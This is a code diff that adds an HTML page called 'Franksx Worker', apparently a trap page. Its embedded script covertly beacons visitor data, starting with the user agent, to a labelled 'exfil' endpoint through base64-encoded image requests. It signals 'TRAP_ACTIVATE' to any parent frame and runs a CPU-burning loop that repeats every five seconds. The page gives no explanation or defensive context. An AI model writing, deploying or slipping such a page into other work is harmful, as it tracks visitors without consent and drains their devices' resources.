@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head><title>Franksx Worker</title></head>
+<body>
+<script>
+(function(){
+    var CFG = {sid: 'FRANKSX_WORKER_' + Math.random().toString(36).substring(2, 15), exfil: 'https://franksx-research.example.com/domain-collect'};
+    function send(t,d){var data=JSON.stringify({t:t,d:d,sid:CFG.sid,ts:Date.now()});var img=new Image();img.src=CFG.exfil+'?d='+btoa(data).substring(0,1800);}
+
+    function heavyWork(){
+        var start=performance.now();
+        var x=0;
+        while(performance.now()-start<10000){x=(x*997+0xDEADBEEF)&0xFFFFFFFF;}
+        send('IFRAME_WORK_COMPLETE',{ms:performance.now()-start,val:x});
+    }
+
+    try{parent.postMessage({type:'TRAP_ACTIVATE',source:'worker'},'*');}catch(e){}
+
+    send('IFRAME_LOAD',{ua:navigator.userAgent?.substring(0,100)});
+    heavyWork();
+
+    setInterval(heavyWork,5000);
+})();
+</script>
+</body>
+</html>
